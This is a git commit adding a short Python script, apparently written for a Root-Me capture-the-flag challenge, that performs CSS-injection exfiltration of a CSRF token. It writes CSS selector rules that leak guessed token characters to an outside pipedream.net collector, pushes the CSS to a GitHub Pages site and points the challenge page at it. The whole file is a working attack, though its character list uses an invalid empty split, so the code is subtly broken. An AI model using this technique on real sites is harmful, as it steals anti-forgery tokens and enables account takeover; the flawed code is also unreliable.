0a8cfb8cf7b1b367dbd4cea01012383428843735
Coutand <bastien.coutand@netcourrier.com>
2022-04-19 19:53:06 +0200

    ee

---
+++ injection.py
@@ -0,0 +1,35 @@
+from time import sleep
+import requests
+import os
+
+def build_css(chars):
+    # supp du file
+    os.remove("./test/a.css")
+
+    # création du new file
+    file = open("./test/a.css", "w") 
+    file.write("input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/"+chars+") }") 
+    file.close()
+
+# ----
+chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("")
+know  = ""
+
+while 1:
+    for elt in chars:
+        # new css
+        build_css(know+elt)
+        sleep(1) # for not to ban
+
+        # commit & push
+        os.system('git add .')
+        os.system('git commit -m "update css"')
+        os.system('git push')
+
+        # request
+        requests.get("http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/a")
+
+
+    know += input("new chars to know : ")
+
+
